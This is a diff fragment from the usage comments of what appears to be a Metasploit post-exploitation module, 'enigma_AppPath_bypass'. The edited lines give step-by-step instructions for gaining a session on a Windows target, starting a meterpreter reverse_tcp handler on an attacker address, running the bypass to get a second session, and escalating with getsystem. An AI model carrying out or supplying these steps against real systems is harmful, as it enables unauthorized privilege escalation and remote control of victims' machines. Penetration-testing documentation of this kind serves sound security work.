@@ -35,9 +35,11 @@
 #
 #
 # [ EXPLOITATION ]
-# 1º - execute the payload.exe (to be uploaded) currespondent handler in background
+# 1º - exploit target system (no need admin privs) and get the session back
+# 2º - execute the 2º payload.exe (to be uploaded) comrrespondent handler in background
 #      msf post(enigma_AppPath_bypass) > handler -p windows/meterpreter/reverse_tcp -H 192.192.1.69 -P 666
-# 2º - execute enigma_AppPath_bypass post-module
+# 3º - execute enigma_AppPath_bypass post-module to get the 2º session back
+# 4º - now we can elevate privileges in 2º session using getprivs and getsystem
 #
 #
 # [ MODULE OPTIONS ]
